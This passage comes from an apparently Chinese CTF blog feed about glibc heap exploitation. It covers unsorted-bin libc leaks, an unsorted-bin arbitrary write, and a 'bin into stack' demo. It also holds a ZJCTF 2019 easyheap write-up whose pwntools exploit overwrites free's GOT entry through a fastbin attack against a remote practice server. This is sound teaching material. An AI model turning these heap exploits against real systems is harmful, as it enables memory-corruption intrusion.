class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x88</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">3</span>,<span class="number">0x48</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">io.recv()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    00000000  43 6f 6e 74  65 6e 74 3a  20 f8 7b d4  61 1a 7f 0a  │Cont│ent:│ ·&#123;·│a···│</span><br><span class="line">    00000010  31 2e 41 44  44 0a 32 2e  43 48 41 4e  47 45 0a 33  │1.AD│D·2.│CHAN│GE·3│</span><br><span class="line">    00000020  2e 50 52 49  4e 54 0a 34  2e 44 45 4c  0a 3a        │.PRI│NT·4│.DEL│·:│</span><br><span class="line">    0000002e</span><br></pre></td></tr></table></figure><p>最后成功泄露出libc地址</p><h2 id="ubuntu-18-04泄露基址"><a href="#ubuntu-18-04泄露基址" class="headerlink" title="ubuntu 18.04泄露基址"></a>ubuntu 18.04泄露基址</h2><p>二进制文件同上</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x90</span>)</span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    create(i,<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">10</span>,<span class="number">0x90</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>办法就是利用 tcachebin的一条链表中只能存放7个chunk 只要我们把其填满了 那么再次释放一个相同大小的chunk就会进入unsortedbin</p><p><a href="https://pic.imgdb.cn/item/637f9bbc16f2c2beb194f702.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637f9bbc16f2c2beb194f702.png"></a></p><p>这里将我们最开始申请的chunk1释放以后 其就因为对应的tcachebin中位置已满 所以进入了unsortedbin  那么接下来利用show函数输出即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x2e bytes:</span><br><span class="line">    00000000  43 6f 6e 74  65 6e 74 3a  20 30 7d 05  ac 42 7f 0a  │Cont│ent:│ 0&#125;·│·B··│</span><br><span class="line">    00000010  31 2e 41 44  44 0a 32 2e  43 48 41 4e  47 45 0a 33  │1.AD│D·2.│CHAN│GE·3│</span><br><span class="line">    00000020  2e 50 52 49  4e 54 0a 34  2e 44 45 4c  0a 3a        │.PRI│NT·4│.DEL│·:│</span><br><span class="line">    0000002e</span><br></pre></td></tr></table></figure><p>这里同时也说明了一点 当tcachebin和unsortedbin中都有free chunk时 且用户申请的chunk大小小于等于二者时unsortedbin优先提供给用户</p><h2 id="任意地址写"><a href="#任意地址写" class="headerlink" title="任意地址写"></a>任意地址写</h2><p>如果单独利用那么是比较鸡肋的一个漏洞点 但是如果配合其他漏洞一起使用 效果非常强大</p><p>主要利用的是unsortedbin取出后 会对其链表进行清空</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>其中bck在代码开始进行了赋值 <a href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#300bck">bck</a> &#x3D; <a href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#291victim">victim</a>-&gt;<a href="https://codebrowser.dev/glibc/glibc/malloc/malloc.c.html#malloc_chunk::bk">bk</a>;</p><p>也就是说如果我们修改了victim的bk域 就会使得unsorted_chunks (av)+0x18处修改为我们修改的bk域</p><p>以及我们修改的地址+0x10处填入unsorted_chunks (av)</p><p>调试环境 libc2.27</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bss_addr = <span class="number">0x602200</span></span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(bss_addr-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">b&#x27;aaaa&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">debug()</span><br></pre></td></tr></table></figure><p>chunk1用来防止chunk0进入unsortedbin后和top chunk合并</p><p>修改chunk0的bk域为bss_addr-0x10  这样到时候bss_addr 就会被写入unsorted_chunks (av)</p><p>动调看一下</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112223179.png" title="image-20230311222348094" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112223179.png" alt="image-20230311222348094"></a></p><p>你会发现这时候由于main_arena的结构被破坏了 plmalloc仍然认为chunk0处于free状态 但是我们的chunk2确实是申请到了chunk0的空间</p><p>这时候如果我们想要再次申请一个chunk 就会报错 这一点要注意</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112225872.png" title="image-20230311222553826" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112225872.png" alt="image-20230311222553826"></a></p><p>此时各地址的值都如我们预期想象的那样</p><h2 id="unsorted-bin-into-stack"><a href="#unsorted-bin-into-stack" class="headerlink" title="unsorted bin into stack"></a>unsorted bin into stack</h2><p>漏洞的原理在于 plmalloc在申请chunk的时候会先去unsortebin中寻找合适的chunk 如果size不符合则通过bk指针索引下一个</p><p>如果我们修改chunk的size和bk  就可以误导plmalloc去对我们构造的fake chunk进行检查 如果通过了检查 就会分配fake chunk给用户</p><p>跟着下面这个程序动调一下就清楚了(不是我写的 我也不知道出处 可能是how2heap的?)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">intptr_t</span> stack_buffer[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating the victim chunk&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* victim = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()&quot;</span>);</span><br><span class="line">  <span class="type">intptr_t</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin&quot;</span>, victim);</span><br><span class="line">  <span class="built_in">free</span>(victim);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Create a fake chunk on the stack&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Set size for next allocation and the bk pointer to any writable address&quot;</span>);</span><br><span class="line">  stack_buffer[<span class="number">1</span>] = <span class="number">0x100</span> + <span class="number">0x10</span>;</span><br><span class="line">  stack_buffer[<span class="number">3</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointern&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_memn&quot;</span>);</span><br><span class="line">  victim[<span class="number">-1</span>] = <span class="number">32</span>;</span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now next malloc will return the region of our fake chunk: %pn&quot;</span>, &amp;stack_buffer[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x100): %pn&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x100</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">编译指令: gcc -g xxx.c   <span class="comment">//加-g动调的时候就可以依据代码逐行进行</span></span><br></pre></td></tr></table></figure><p>首先是申请了两个chunk chunk0用来误导plmalloc chunk1用来防止chunk0和top chunk合并</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112257522.png" title="image-20230311225736485" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112257522.png" alt="image-20230311225736485"></a></p><p>释放chunk0 进入unsortedbin</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112258579.png" title="image-20230311225827543" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112258579.png" alt="image-20230311225827543"></a></p><p>伪造局部变量数组(也就是位于栈上的一块内存) 修改size域和bk域 bk域是为了迎合检查 双向链表的完整性</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112259815.png" title="image-20230311225931787" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112259815.png" alt="image-20230311225931787"></a></p><p>修改chunk0的size域和bk域 误导plmalloc</p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306093.png" title="image-20230311230601067" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306093.png" alt="image-20230311230601067"></a></p><p>最后申请一个0x100大小的chunk 分配到的区域为栈上的数组<a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306954.png" title="image-20230311230656926" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112306954.png" alt="image-20230311230656926"></a></p><p><a href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112307511.png" title="image-20230311230747477" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202303112307511.png" alt="image-20230311230747477"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> heap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ZJCTF 2019.easyheap</title>
      <link href="/2022/11/21/ZJCTF-2019-easyheap/"/>
      <url>/2022/11/21/ZJCTF-2019-easyheap/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用</p><p>分析一下程序</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>没有开启FULL RELRO 意味着可以覆写got表</p><p>ida继续跟进 main函数很常规 这里重点关注一下add free edit这三个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      *(&amp;heaparray + i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>申请的堆块存储到了bss段上的heaparray数组里面 同时每个指针占据8个字节</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(&amp;heaparray + v1), v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供了堆溢出的机会 可以供我们修改size域来合并chunk</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">9</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>free后把指针清零了 没有办法uaf</p><p>了解完程序主体后 结合一下版本为ubuntu16 没有tcache 并且还有堆溢出 可以合并堆块 从而获得两个指向同一空间的chunk 这样就可以修改fastbinchunk的fd域 获得任意地址写的机会</p><p>接着再来关注一下这个heaparray 我们看完了代码后 可以得知  edit函数 是修改heaparray所指向的地址的内容</p><p>那如果我们利用上文提到的任意写的漏洞 将heaparray的其中一个指针修改为free_got 那么不就可以修改got表 成功进行系统调用了</p><p>不过fastbin attack需要注意的是  glibc对其取出bin时有检查机制  我们的fakechunk的地址需要合理构造 才能成功取出</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29611</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;SuccessFul&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Done !&quot;</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_addr = <span class="number">0x400700</span></span><br><span class="line">heaparray_addr = <span class="number">0x6020E0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+p16(<span class="number">0xe1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#4&amp;1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&quot;1&quot;</span>)<span class="comment">#5&amp;2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload = p64(heaparray_addr-<span class="number">51</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>这部分代码的思路 我前面几题堆wp也有涉及 老办法了 不懂具体流程的可以翻看以往wp</p><p>重点在于最后我们要任意写的地方 位于heaparray-51的地方 这是为什么？ 我们gdb动调看看</p><p><a href="https://pic.imgdb.cn/item/637b445a16f2c2beb146a7b9.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/637b445a16f2c2beb146a7b9.png"></a></p><p>如果不-51的话 此时我们想要伪造的chunk的size域值为878030 不符合glibc的检查机制 如果想要申请出来时 程序就会强行终止</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x9b3 bytes:</span><br><span class="line">    b&quot;*** Error in `./pwn&#x27;: malloc(): memory corruption (fast): 0x00000000006020f0 ***\n&quot;</span><br><span class="line">    b&#x27;======= Backtrace: =========\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f93309967f5]\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x82679)[0x7f93309a1679]\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f93309a31d4]\n&#x27;</span><br><span class="line">    b&#x27;./pwn[0x4009b5]\n&#x27;</span><br><span class="line">    b&#x27;./pwn[0x400ce1]\n&#x27;</span><br><span class="line">    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f933093f840]\n&#x27;</span><br><span class="line">    b&#x27;./pwn[0x4007b9]\n&#x27;</span><br><span class="line">    b&#x27;======= Memory map: ========\n&#x27;</span><br><span class="line">    b&#x27;00400000-00402000 r-xp 00000000 08:01 1066204                            /home/chen/pwn\n&#x27;</span><br><span class="line">    b&#x27;00601000-00602000 r--p 00001000 08:01 1066204                            /home/chen/pwn\n&#x27;</span><br><span class="line">    b&#x27;00602000-00603000 rw-p 00002000 08:01 1066204                            /home/chen/pwn\n&#x27;</span><br><span class="line">    b&#x27;02381000-023a2000 rw-p 00000000 00:00 0                                  [heap]\n&#x27;</span><br><span class="line">    b&#x27;7f932c000000-7f932c021000 rw-p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f932c021000-7f9330000000 ---p 00000000 00:00 0 \n&#x27;</span><br><span class="line">    b&#x27;7f9330709000-7f933071f000 r-xp 00000000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&#x27;</span><br><span class="line">    b&#x27;7f933071f000-7f933091e000 ---p 00016000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&#x27;</span><br><span class="line">    b&#x27;7f933091e000-7f933091f000 rw-p 00015000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&#x27;</span><br><span class="line">    b&#x27;7f933091f000-7f9330adf000 r-xp 00000000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330adf000-7f9330cdf000 ---p 001c0000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330cdf000-7f9330ce3000 r--p 001c0000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330ce3000-7f9330ce5000 rw-p 001c4000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\n&#x27;</span><br><span class="line">    b&#x27;7f9330ce5000-7f9330ce9000 rw-p 00000000 00:00 0 